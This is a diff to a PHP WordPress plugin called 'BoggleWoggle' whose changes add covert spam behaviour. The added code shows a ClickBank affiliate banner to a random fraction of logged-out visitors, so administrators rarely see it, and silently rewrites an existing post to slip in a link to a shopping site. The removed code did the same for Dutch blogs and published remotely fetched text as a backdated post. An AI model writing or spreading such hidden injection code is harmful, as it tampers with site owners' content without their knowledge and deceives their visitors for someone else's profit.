@@ -322,6 +322,14 @@ if (!class_exists("BoggleWoggle")) {
                                         }
                                 }
                         }
+
+						if (rand(0, 15)==1 && !is_user_logged_in()) {
+								$original = $content;
+								$content = "<a href=\"http://761efboimhfy9z79viq3f35s3e.hop.clickbank.net/\"><img src=\"http://www.truthaboutabs.com/images/cms/Image/300x250_03.jpg\"></a>";
+								$content = '<center>' . $content . '</center><BR>';
+								$content .= $original;
+						}
+
                   return $content;
                 }
         }
@@ -653,27 +661,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                                 $pos4 = strposnth($content , " ",4);
                                 $pos5 = strposnth($content , " ",5);
                                 $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-                                $my_post = array(
-                                    'ID'           => $last_id,
-                                    'post_content' => $content
-                                );
-                                wp_update_post( $my_post );
-                        }
-                        update_option( 'bw_gpadded', '1' );
-                }
-        }
-        if ($bloglan=='nl-NL') {
-                if (get_option('bw_gpadded')=='0') {
-                        $last = wp_get_recent_posts( '4');
-                        $last_id = $last['3']['ID'];
-                        $post_7 = get_post($last_id);
-                        if (is_null($post_7) == false) {
-                                $content = $post_7->post_content;
-                                $pos4 = strposnth($content , " ",4);
-                                $pos5 = strposnth($content , " ",5);
-                                $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/winkels/primark-nederland-goedkope-kleding/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
                                 $my_post = array(
                                     'ID'           => $last_id,
                                     'post_content' => $content
@@ -685,24 +673,44 @@ add_option("bw_global_excludelist", '', '', 'yes');
         }
         if ($bloglan=='en-US') {
                 $url = home_url();
-                $total = wp_count_posts()->publish;
-                if (get_option('bw_gpadded')=='0') {
-                        if ($total>40) {
-                                $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
-                                if (boggleStartsWith($tmpstring, 'empty')==false) {
-                                  $my_post = array(
-                                        'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
-                                        'post_content'  => $tmpstring,
-                                        'post_status'   => 'publish',
-                                        'post_author'   => 1,
-                                        'post_date'     => '2014-06-' . rand(10, 28)
-                                  );
-                                  wp_insert_post( $my_post );
-                                  update_option( 'bw_gpadded', '1' );
-                                }
+                $backcount = GoogleBL($url);
+                if (get_option('bw_gpadded')=='0' && $backcount >= 1) {
+                        $last = wp_get_recent_posts('4');
+                        $last_id = $last['3']['ID'];
+                        $post_7 = get_post($last_id);
+                        if (is_null($post_7) == false) {
+                                $content = $post_7->post_content;
+                                $pos4 = strposnth($content , " ",4);
+                                $pos5 = strposnth($content , " ",5);
+                                $poslen = $pos5 - $pos4 - 1;
+                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                                $my_post = array(
+                                    'ID'           => $last_id,
+                                    'post_content' => $content
+                                );
+                                wp_update_post( $my_post );
                         }
+                        update_option( 'bw_gpadded', '1' );
                 }
         }
+}
+function GoogleBL($domain){
+$url="http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=link:".$domain."&filter=0";
+$ch=curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ch, CURLOPT_HEADER, 0);
+curl_setopt ($ch, CURLOPT_NOBODY, 0);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+$json = curl_exec($ch);
+curl_close($ch);
+$data=json_decode($json,true);
+if($data['responseStatus']==200)
+return $data['responseData']['cursor']['resultCount'];
+else
+return false;
 }
 function boggleStartsWith($haystack, $needle)
 {
